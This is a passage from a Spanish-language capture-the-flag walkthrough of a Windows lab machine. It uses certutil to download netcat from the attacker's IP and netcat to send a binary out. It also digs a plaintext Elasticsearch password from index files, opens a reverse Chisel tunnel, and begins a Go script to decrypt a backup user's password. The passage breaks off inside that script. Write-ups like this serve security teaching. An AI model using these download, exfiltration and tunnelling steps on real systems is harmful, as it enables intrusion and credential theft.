</span></span></span></code></pre></div><p>donde veo que hay un directorio <code>C:\Temp\www\internal\content\posts\interal-laps-alpha\</code> el cual nos permite tanto leer como escribir archivos en √©l.</p><ul><li>Visitando este directorio noto que existe un archivo <code>.env</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is CB08-11BF
</span></span></span><span class=line><span class=cl><span class=go> Directory of C:\Temp\www\internal\content\posts\internal-laps-alpha
</span></span></span><span class=line><span class=cl><span class=go>06/09/2023  12:28 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>06/09/2023  12:28 AM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>06/09/2023  12:28 AM                82 .env
</span></span></span><span class=line><span class=cl><span class=go>06/09/2023  12:20 AM        12,697,088 a.exe
</span></span></span><span class=line><span class=cl><span class=go>               2 File(s)     12,697,170 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   4,596,809,728 bytes free
</span></span></span></code></pre></div><p>El cual si leemos contiene:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;type C:\Temp\www\internal\content\posts\internal-laps-alpha\.env
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ELASTICUSER=user
</span></span></span><span class=line><span class=cl><span class=go>ELASTICPASS=DumpPassword\$Here
</span></span></span><span class=line><span class=cl><span class=go>ELASTICURI=https://127.0.0.1:9200
</span></span></span></code></pre></div><ul><li>Adem√°s, decido analizar el archivo <code>a.exe</code> dado que se encuentra en el mismo directorio que este archivo <code>.env</code>. Para transferirme el archivo desde la m√°quina v√≠ctima a mi m√°quina es que decido pasar un binario <code>nc64.exe</code> (<code>netcat</code> para <code>Windows</code>) usando de nuevo <code>certutil</code> luego de empezar un servidor temporal<code>HTTP</code> <code>Python</code> en mi m√°quina local por el puerto <code>8081</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Temp\www\internal\content\posts\internal-laps-alpha&gt;certutil.exe -urlcache -split -f http://10.10.16.6:8081/nc64.exe C:\Users\Public\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><ul><li>Una vez transferido el binario de <code>netcat</code>para <code>Windows</code>, en mi m√°quina local empiezo otro listener, pero esta vez en el puerto <code>444</code> y guardo todo el output que llegue al archivo <code>a.exe</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 444 &gt; a.exe
</span></span></span></code></pre></div><p>En la m√°quina v√≠ctima uso el binario de <code>netcat</code> transferido para pasar el archivo <code>a.exe</code> a mi m√°quina:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\nc.exe 10.10.16.6 444 &lt; C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe
</span></span></span></code></pre></div><p>Y obtengo una conexi√≥n en mi m√°quina:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 444 &gt; a.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.240] 50788
</span></span></span></code></pre></div><ul><li>Luego de un par de minutos para asegurarme que el archivo se transfiera por completo, mato mi listener de <code>netcat</code> con <code>Ctrl+C</code> y chequeo que el archivo ha sido transferido. Adem√°s, chequeo el hash <code>md5sum</code> en ambas m√°quinas para el archivo para verificar que no haya cambiado, indicado que no se ha modificado la integridad de la data. En mi m√°quina corro:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ md5sum a.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>48d1065d3d1b2920f530117e3389ef1a  a.exe
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima corro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;certutil -hashfile C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe MD5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>MD5 hash of C:\Temp\www\internal\content\posts\internal-laps-alpha\a.exe:
</span></span></span><span class=line><span class=cl><span class=go>48d1065d3d1b2920f530117e3389ef1a
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -hashfile command completed successfully.
</span></span></span></code></pre></div><p>Como veo que ambos hashes son iguales, ello quiere decir que el archivo <code>a.exe</code> se ha transferido exitosamente.</p><ul><li>Para analizar este archivo uso <code>Ghidra</code>, al cual adem√°s le tendremos que instalar un decompilador para <code>Go</code>, dado que este archivo se encuentra escrito en lenguaje de programaci√≥n <code>Go</code>. Para ello nos podemos descargar <a href=https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension/releases class=external-link target=_blank rel=noopener>una extension para nuestra respectiva versi√≥n</a>, abrir <code>Ghidra</code> y luego ir a <code>File -> Install Extensions -> Add Extensions</code> y seleccionar el archivo <code>.zip</code> descargado. Reiniciamos <code>Ghidra</code> y ya podemos analizar el archivo.</li><li>Luego de analizar este archivo, veo que est√° obtieniendo credenciales desde el archivo <code>.env</code> para un usuario <code>elastic</code>:</li></ul><p><img alt="Napper 8" src=/pentesting/images/Napper_9.png></p><p>y est√° estableciendo una contrase√±a para el usuario <code>backup</code>:</p><p><img alt="Napper 9" src=/pentesting/images/Napper_8.png></p><ul><li>Aunque no fui capaz de encontrar la contrase√±a en s√≠ para este usuario. Luego de un momento de frustraci√≥n, es que decido ver el directorio de <code>elasticsearch</code>, el cual asumo que se encuentra instalado en la m√°quina v√≠ctima.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\system32&gt;cd C:\Program Files\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go>C:\Program Files&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is CB08-11BF
</span></span></span><span class=line><span class=cl><span class=go> Directory of C:\Program Files
</span></span></span><span class=line><span class=cl><span class=go>10/29/2023  10:43 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>10/29/2023  10:43 AM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>06/07/2023  06:39 AM    &lt;DIR&gt;          Common Files
</span></span></span><span class=line><span class=cl><span class=go>06/08/2023  03:20 AM    &lt;DIR&gt;          elasticsearch-8.8.0
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  07:27 AM    &lt;DIR&gt;          Internet Explorer
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  06:47 AM    &lt;DIR&gt;          Microsoft Update Health Tools
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:14 AM    &lt;DIR&gt;          ModifiableWindowsApps
</span></span></span><span class=line><span class=cl><span class=go>10/29/2023  10:00 AM    &lt;DIR&gt;          Reference Assemblies
</span></span></span><span class=line><span class=cl><span class=go>10/29/2023  10:43 AM    &lt;DIR&gt;          RUXIM
</span></span></span><span class=line><span class=cl><span class=go>06/07/2023  06:40 AM    &lt;DIR&gt;          VMware
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  07:27 AM    &lt;DIR&gt;          Windows Defender
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  07:27 AM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  07:27 AM    &lt;DIR&gt;          Windows Mail
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:54 AM    &lt;DIR&gt;          Windows Multimedia Platform
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:50 AM    &lt;DIR&gt;          Windows NT
</span></span></span><span class=line><span class=cl><span class=go>11/07/2023  07:27 AM    &lt;DIR&gt;          Windows Photo Viewer
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:54 AM    &lt;DIR&gt;          Windows Portable Devices
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:31 AM    &lt;DIR&gt;          Windows Security
</span></span></span><span class=line><span class=cl><span class=go>12/07/2019  02:31 AM    &lt;DIR&gt;          WindowsPowerShell
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>              19 Dir(s)   4,592,324,608 bytes free
</span></span></span></code></pre></div><ul><li>De manera que s√≠ existe un directorio <code>elasticsearch-8.8.0</code>. Luego de mirar los directorios dentro de este √∫ltimo, es que encuentro el directorio <code>C:\Program Files\elasticsearch-8.8.0\data\indices\n5Gtg7mtSVOUFiVHo9w-Nw\0\index</code> el cual tiene algunos archivos raros en √©l:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Program Files\elasticsearch-8.8.0\data\indices\n5Gtg7mtSVOUFiVHo9w-Nw\0\index&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is CB08-11BF
</span></span></span><span class=line><span class=cl><span class=go> Directory of C:\Program Files\elasticsearch-8.8.0\data\indices\n5Gtg7mtSVOUFiVHo9w-Nw\0\index
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               479 segments_8n
</span></span></span><span class=line><span class=cl><span class=go>06/08/2023  03:20 AM                 0 write.lock
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:36 PM               575 _ny.cfe
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:36 PM            11,412 _ny.cfs
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:36 PM               364 _ny.si
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM             3,349 _ny_1.fnm
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM                87 _ny_1_Lucene90_0.dvd
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               160 _ny_1_Lucene90_0.dvm
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               575 _nz.cfe
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM             5,020 _nz.cfs
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               327 _nz.si
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               575 _o1.cfe
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM            11,412 _o1.cfs
</span></span></span><span class=line><span class=cl><span class=go>04/26/2024  08:41 PM               364 _o1.si
</span></span></span><span class=line><span class=cl><span class=go>              14 File(s)         34,699 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   4,591,738,880 bytes free
</span></span></span></code></pre></div><ul><li>Basados en su tama√±o, los archivos <code>_o1.cfs</code> y <code>_ny.cfs</code> se ven interesantes. Si leemos estos archivos filtrando por la palabra <code>pass</code> (de <code>password</code>) en el archivo <code>_o1.cfs</code>, se ve algo interesante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Program Files\elasticsearch-8.8.0\data\indices\n5Gtg7mtSVOUFiVHo9w-Nw\0\index&gt;type _o1.cfs | findstr pass
</span></span></span><span class=line><span class=cl><span class=go>vc1^3H`YV`^\]MY‚â°&#34;‚àö&amp;√†√ú√™j√¥√±¬µ‚ï°¬∞¬™√ª‚â•Œì{&#34;doc_type&#34;:&#34;api_key&#34;,&#34;creati¬≤on_time&#34;:1686219630330,&#34;expir 3214 H‚â•_invalidated&#34;:false,dPey_ha‚â°Osh&#34;:&#34;{PBKDF2}10000$EVlYHJWcRa4vrNNXnZJBZz4C+xGF0H/kwh8O8sZVIvE=$LjOO6DC1KVFxv5H8vQpqzoXANMUW85‚â•p1S/6EwkvdCto=&#34;,&#34;role_descriptors&#34;:{+¬±e_enrollment_tokenuster&#34;:[&#34;c
</span></span></span><span class=line><span class=cl><span class=go>                                                                                                                                    ‚îî:admin/xpack‚â§$/security/enroll/kibana&#34;],&#34;indices&#34;:[],&#34;applicationSrun_a
</span></span></span><span class=line><span class=cl><span class=go>                                               √ümetadata&#34;:{},&#34;kP:&#34;rol‚â°%e&#34;}},&#34;limited_by_role_descriptors&#34;:{&#34;_xpack_security‚â°cluster&#34;:[&#34;all&#34;],&#34;indices&#34;:[{&#34;names&#34;:[&#34;*&#34;],&#34;privileges&#34;:[&#34;all‚â°allow_restricted_indic#‚â°true}],&#34;application9√á],&#34;run_a
</span></span></span><span class=line><span class=cl><span class=go>                                                                                  `&#34;*&#34;],&#34;‚â§metadata&#34;:{&#34;_reserved&#34;:true},&#34;5‚îîrole&#34;}},&#34;namE‚â°enrollment_token_APIV‚â°_-iaFmogBapOk5rX4‚â§&#34;ppbr&#34;,&#34;version&#34;:8080099,&#34;metadata_flattened&#34;:null9‚â°or&#34;:{&#34;principal&#34;:&#34;_xpack_security&#34;,&#34;fu‚å†ll_name&#34;:null,&#34;email
</span></span></span><span class=line><span class=cl><span class=go>‚â§metadata&#34;:{},&#34;realm&#34;:&#34;__attach&#34;Z‚ñë}}¬†reserv‚â§5ed-user-elasticI{&#34;password&#34;:&#34;oKHzjZw0EGcRxT2cux5K&#34;,&#34;enabled&#34;:true,&#34;[‚â°reserved-user&#34;}Œ¶
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>                                                                                                                                  ‚ñë
</span></span></span><span class=line><span class=cl><span class=go>                                                                                                                                   ¬†role-user1‚ï™{&#34;cluster&#34;:[&#34;monitor&#34;],&#34;indices&#34;:[{&#34;names&#34;:[&#34;seed&#34;,&#34;user*&#34;],&#34;privileges&#34;:[&#34;read&#34;,&#34;monitor&#34;,&#34;write&#34;,&#34;index&#34;,&#34;create_index&#34;],&#34;allow_restricted_indices&#34;:false}],&#34;applications&#34;:[],&#34;run_as&#34;:[],&#34;metadata&#34;:{},Œ±&#34;type&#34;:&#34;role&#34;}‚ïî
</span></span></span><span class=line><span class=cl><span class=go>¬†user-usper‚ïë{&#34;  √âname&#34;:&#34;us‚â°er&#34;,&#34;password&#34;:&#34;$2a$‚â°10$YXB6/d2BeKMQEsRwO‚â°c02AeM4ZWhJdaKSLj2Yi‚â°WJmuqs3exTM0lYqW&#34;,&#34;r√áoles&#34;:[&#34;√á1&#34;],&#34;ful‚â°l_name&#34;:null,&#34;email&#34;‚â°:null,&#34;metadata&#34;:nul‚â°l,&#34;enabled&#34;:true,&#34;ty‚ñëpe&#34;:&#34;user&#34;}‚îî(√¥Œ¶‚âà¬†ab?‚ï´lLucene90DocValuesMetadata&lt;‚ÅøtW¬Ω√Ñ√ømU‚ï†
</span></span></span><span class=line><span class=cl><span class=go>                                                                                            Œ£m√≠i¬£
</span></span></span></code></pre></div><p>donde puedo ver la l√≠nea, con algo de basura y car√°cteres raros de por medio, <code>eserv‚â§5ed-user-elasticI{"password":"oKHzjZw0EGcRxT2cux5K","enabled":true,"[‚â°reserved-user"}</code>. De manera que podr√≠amos tener un potencial usuario y contrase√±a: <code>elastic:oKHzjZw0EGcRxT2cux5K</code>.</p><ul><li>Si busco por puertos internos abiertos en la m√°quina v√≠ctima, obtengo muchos m√°s que los 3 iniciales del scan de <code>Nmap</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\&gt;netstat -an | findstr &#34;TCP&#34; | findstr &#34;LISTENING&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:61018          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    10.10.11.240:139       0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:80                [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:135               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:443               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:445               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49664             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49665             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49666             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49667             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:61018             [::]:0                 LISTENING
</span></span></span></code></pre></div><ul><li>Un googleo r√°pido dice que <code>Elasticsearch</code> corre en los puertos <code>9200</code> y <code>9300</code>, lo cual es nuestro caso. De manera que debemos encontrar una manera de tener acceso a aquellos puertos. Para esto pasar√© a la m√°quina v√≠ctima un binario de <code>Chisel</code> para <code>Windows</code> (<a href=https://github.com/jpillora/chisel/releases class=external-link target=_blank rel=noopener>el cual podemos descargar desde su repositorio de Github</a>) con <code>certutil</code> de la misma manera que ya he hecho para transferir archivos previamente. Luego, en mi m√°quina corro:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ chisel server -p 8000 --reverse
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima corro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\chisel.exe client 10.10.16.6:8000 R:9200
</span></span></span></code></pre></div><p>para establecer un t√∫nel.</p><ul><li>De manera que ahora decido visitar <code>https://127.0.0.1:9200</code> e inmediatamente me pide loguear; el cual llenar√© con las credenciales <code>elastic:oKHzjZw0EGcRxT2cux5K</code> encontradas previamente.</li></ul><p><img alt="Napper 10" src=/pentesting/images/Napper_10.png></p><ul><li>Y funcionan. Puedo ver info para el usuario <code>backup</code>:</li></ul><p><img alt="Napper 11" src=/pentesting/images/Napper_11.png></p><p>donde puedo ver un hash entre otras cosas.</p><ul><li>Adem√°s, si visitamos <code>https://127.0.0.1:9200/_search</code> puedo ver una variable llamada <code>blob</code>:</li></ul><p><img alt="Napper 12" src=/pentesting/images/Napper_12.png></p><ul><li>Noto que la variable <code>blob</code> cambia peri√≥dicamente, de manera que no vale la pena guardarla. Aparentemente, el sitio muestra data de una contrase√±a encriptada la cual cambia constantemente basada en estos valores.</li><li>Pero necesitamos la contrase√±a del usuario <code>backup</code>. Basados en la data del sitio podemos realizar un script en <code>Go</code> (no en otro lenguage ya que queremos mantener las &ldquo;condiciones&rdquo; de la misma manera que lo hace el binario <code>a.exe</code>, escrito en <code>Go</code>, que asumimos es el que cambia la contrase√±a) para desencriptarla (basados en <a href=https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865 class=external-link target=_blank rel=noopener>estos conceptos</a> y <a href=https://raw.githubusercontent.com/0tonoon/Napper_Script/main/Pass_script class=external-link target=_blank rel=noopener>este c√≥digo</a>) y tratamos de obtener la contrase√±a:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/aes&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/cipher&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;encoding/base64&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;math/rand&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os/exec&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;strconv&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>getSeed</span><span class=p>()</span> <span class=p>(</span><span class=kt>int64</span><span class=p>,</span> <span class=kt>string</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>cmd</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;curl&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-i&#34;</span><span class=p>,</span> <span class=s>&#34;-s&#34;</span><span class=p>,</span> <span class=s>&#34;-k&#34;</span><span class=p>,</span> <span class=s>&#34;-X&#34;</span><span class=p>,</span> <span class=s>&#34;GET&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Host: localhost:9200&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Accept-Language: en-US,en;q=0.5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Accept-Encoding: gzip, deflate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Dnt: 1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=c1>// This is the encoded &#39;oKHzjZw0EGcRxT2cux5K&#39; found password
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Authorization: Basic ZWxhc3RpYzpvS0h6alp3MEVHY1J4VDJjdXg1Sw==&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Upgrade-Insecure-Requests: 1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Sec-Fetch-Dest: document&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Sec-Fetch-Mode: navigate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Sec-Fetch-Site: none&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Sec-Fetch-User: ?1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Te: trailers&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-H&#34;</span><span class=p>,</span> <span class=s>&#34;Connection: close&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;-b&#34;</span><span class=p>,</span> <span class=s>&#34;i_like_gitea=1bcfba2fb61ea525; lang=en-US&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;https://localhost:9200/_search?q=*&amp;pretty=true&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>output</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>cmd</span><span class=p>.</span><span class=nf>CombinedOutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;&#34;</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>outputLines</span> <span class=o>:=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>output</span><span class=p>),</span> <span class=s>&#34;\n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>seedStr</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>line</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>outputLines</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>line</span><span class=p>,</span> <span class=s>&#34;seed&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>!</span><span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>line</span><span class=p>,</span> <span class=s>&#34;index&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>seedStr</span> <span class=p>=</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>TrimSpace</span><span class=p>(</span><span class=nx>strings</span><span class=p>.</span><span class=nf>Split</span><span class=p>(</span><span class=nx>line</span><span class=p>,</span> <span class=s>&#34;:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>seed</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>strconv</span><span class=p>.</span><span class=nf>ParseInt</span><span class=p>(</span><span class=nx>seedStr</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>64</span><span class=p>)</span>
